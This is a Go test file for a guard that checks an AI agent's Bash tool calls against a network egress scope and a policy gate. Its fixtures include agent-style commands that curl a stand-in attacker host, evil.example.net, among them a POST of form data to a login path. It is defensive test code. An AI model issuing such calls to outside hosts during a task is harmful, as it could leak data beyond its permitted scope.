package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/artex/events"
	"github.com/Autumn-27/artex/policy"
)

func TestEgressGateDenyBlocksAndEmits(t *testing.T) {
	g := New()
	var got []events.Event
	g.SetEventPublisher(func(e events.Event) { got = append(got, e) })
	g.SetEgressChecker(func(ctx context.Context, tool string, input json.RawMessage) (bool, bool, string) {
		return true, false, "target outside task egress scope (deny by default)"
	})
	b, msg, _ := g.Hooks().PreToolUse(context.Background(), "Bash",
		json.RawMessage(`{"command":"curl -s http://evil.example.net/x"}`))
	if !b {
		t.Fatal("egress deny must block")
	}
	if msg == "" {
		t.Fatal("block message must be non-empty")
	}
	var saw bool
	for _, e := range got {
		if e.Kind == events.EvEgressViolation {
			saw = true
			if p, ok := e.Payload.(EgressViolationPayload); !ok || !p.Blocked {
				t.Fatalf("payload = %#v, want blocked EgressViolationPayload", e.Payload)
			}
		}
	}
	if !saw {
		t.Fatal("EvEgressViolation must be emitted on deny")
	}
}

func TestEgressGateObserveAllowsButEmits(t *testing.T) {
	g := New()
	var saw bool
	g.SetEventPublisher(func(e events.Event) {
		if e.Kind == events.EvEgressViolation {
			saw = true
		}
	})
	g.SetEgressChecker(func(ctx context.Context, tool string, input json.RawMessage) (bool, bool, string) {
		return false, true, "observe-mode egress violation"
	})
	b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash",
		json.RawMessage(`{"command":"curl -s http://evil.example.net/x"}`))
	if b {
		t.Fatal("observe mode must not block")
	}
	if !saw {
		t.Fatal("observe mode must still emit EvEgressViolation")
	}
}

func TestEgressGateInScopeAllows(t *testing.T) {
	g := New()
	var evs []events.Event
	g.SetEventPublisher(func(e events.Event) { evs = append(evs, e) })
	g.SetEgressChecker(func(ctx context.Context, tool string, input json.RawMessage) (bool, bool, string) {
		return false, false, ""
	})
	b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash",
		json.RawMessage(`{"command":"curl -s http://example.com/x"}`))
	if b {
		t.Fatal("in-scope call must proceed")
	}
	for _, e := range evs {
		if e.Kind == events.EvEgressViolation {
			t.Fatal("no violation event for in-scope call")
		}
	}
}

func TestEgressGateDisabledByDefault(t *testing.T) {
	g := New()
	b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash",
		json.RawMessage(`{"command":"curl -s http://evil.example.net/x"}`))
	if b {
		t.Fatal("default (no checker) must not block")
	}
}

func TestEgressGateOrderAfterPolicyGate(t *testing.T) {
	// 政策门 deny（passive 档 curl POST）应优先于 egress —— egress checker 不应被调用。
	g := New()
	g.SetPolicyResolver(fixedResolver(policy.Passive))
	called := false
	g.SetEgressChecker(func(ctx context.Context, tool string, input json.RawMessage) (bool, bool, string) {
		called = true
		return false, false, ""
	})
	b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash",
		json.RawMessage(`{"command":"curl -X POST -d a=1 http://evil.example.net/login"}`))
	if !b {
		t.Fatal("policy gate must block the POST before egress runs")
	}
	if called {
		t.Fatal("egress checker must not run after a policy-gate deny")
	}
}
